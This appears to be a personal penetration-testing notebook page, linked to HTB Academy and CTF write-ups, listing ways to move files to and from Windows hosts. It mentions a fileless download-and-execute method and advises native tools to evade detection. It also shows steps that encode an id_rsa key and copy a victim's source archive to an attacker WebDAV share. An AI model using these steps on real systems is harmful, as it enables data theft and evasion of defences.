# Windows File Transfer

## Table of Contents
```table-of-contents
exclude: /Table of Contents/i
minLevel: 2
style: nestedList
hideWhenEmpty: true
```

## Overview

For transferring files to/from Windows machines.

## Key Concepts

To avoid detection, it's recommended to try to use Windows-native tools to transfer files as much as possible.

## Downloading

### Powershell

#### Method 1: Base64 Encoding

> [!warning] While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 

**Step 1:** Check the MD5 hash of the contents.
```bash
md5sum id_rsa
```

**Step 2:** Encode contents to base64 and copy it to clipboard.
```bash
cat id_rsa | base64 -w 0; echo
```

**Step 3:** On the Windows machine, decode the contents in your clipboard to a file.
![[powershell#^decode-base64-to-file]]

**Step 4:** Confirm the MD5 hash matches
![[powershell#^get-file-md5-hash]]

#### Method 2: DownloadFile

Download a file to a specified location.
![[powershell#^downloadfile-method]]

#### Method 3: DownloadString - Fileless

Download and execute a remote file in memory - filelessly!
![[powershell#^downloadstring-method-fileless]]

#### Method 4: Invoke-WebRequest

> [!warning]  `Invoke-WebRequest` is noticeably slower at downloading files than `(New-Object Net.WebClient).DownloadFile`

Download a file to a specified location.
![[powershell#^outfile-invoke-webrequest]]

##### Changing User Agent

**Step 1:** List available User Agents
![[powershell#^list-user-agents]]

**Step 2:** Save a User Agent to a variable. (preferably one used on the machine/network).
![[powershell#^save-user-agent]]

**Step 3:** Download a file with a specific User Agent.
![[powershell#^invoke-webrequest-user-agent]]

#### Method 5: WinRM

**Step 1:** Test the WinRM connection to the Windows machine
![[powershell#^test-winrm-connection]]

**Step 2:** Create a new session
![[powershell#^new-pssession]]

**Step 3:** Copy the file from the remote Windows machine to the local Windows machine.
![[powershell#^from-transfer-winrm]]

### SMB

#### Method 1: impacket-smbserver

**Step 1:** Create an SMB server on the Linux machine
![[impacket-smbserver#^create-authenticated-smb-server]]

**Step 2:** Mount the SMB server
```powershell
net use n: \\192.168.220.133\share /user:test test
```

**Step 3:** Copy the file from the share to the Windows machine
```powershell
copy n:\<file>
```

### FTP

#### Method 1: pyftpdlib

**Step 1:** Create an FTP server with Python on the Linux machine
![[python#^create-ftp-server]]

**Step 2:** Download the files to the Windows machine
![[powershell#^downloadfile-method]]

### RDP

#### Method 1: Mounting

**Step 1:** RDP to the Windows machine and mount a folder on the Linux machine
![[xfreerdp#^mount-linux-folder]]

**Step 2:** Transfer files over the network.
![[Pasted image 20250614110909.png]]

## Uploading

### Powershell

#### Method 1: Base64 Encoding

##### Copying

**Step 1:** Check the MD5 hash of the contents.
![[powershell#^decode-base64-to-file]]

**Step 2:** Encode contents to base64 and copy it to clipboard.
![[powershell#^encode-file-contents-to-base64]]

**Step 3:** On the Linux machine, decode the contents in your clipboard to a file.
```bash
echo "base64 content" | base64 -d > hosts
```

**Step 4:** Confirm the MD5 hash matches.
```bash
md5sum id_rsa
```

##### Uploading

**Step 1:** Encode the file content to Base64 and save it to a variable.
![[powershell#^b64-file-content-variable]]

**Step 2:** Open a netcat listener on the Linux machine.
![[netcat#^open-listener]]

**Step 3:** Send the Base64 encoded file contents to the listener
![[powershell#^send-b64-post]]

#### Method 2: WinRM

**Step 1:** Test the WinRM connection to the Windows machine
![[powershell#^test-winrm-connection]]

**Step 2:** Create a new session
![[powershell#^new-pssession]]

**Step 3:** Copy the file from local Windows machine to remote Windows machine.
![[powershell#^to-transfer-winrm]]


### FTP

#### Method 1: pyftpdlib

**Step 1:** Create an FTP server with write permissions on the Linux machine.
![[python#^write-create-ftp-server]]

**Step 2:** Upload a file from the Windows machine.
![[powershell#^uploadfile-method]]

### HTTP

#### Method 1: uploadserver

Set up a webserver with upload page
![[python#^uploadserver]]

#### Method 2: wsgidav

**Step 1:** Create a WebDav share on the Linux machine
![[python#^wsgidav-create-share]]

**Step 2:** Connect to the share on the Windows machine
```powershell
dir \\192.168.49.128\DavWWWRoot
```

**Step 3:** Upload files from the Windows machine
```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\www\
```

## File Encryption

**Step 1:** Download [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)

**Step 2:** Import Invoke-AESEncryption.ps1
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

**Step 3:** Encrypt a file
![[powershell#^aes-encyrpt-file]]

**Step 4:** Decrypt the file
![[powershell#^aes-decrypt-file]]

## LOLBAS

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.
![[Pasted image 20250614115122.png]]

## Related Techniques

- [[Linux File Transfer]]

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #windows-file-transfer
SORT file.ctime DESC
LIMIT 5
```

## Learning Resources

- [File Transfers - HTB Academy](https://academy.hackthebox.com/module/details/24)

#windows-file-transfer #technique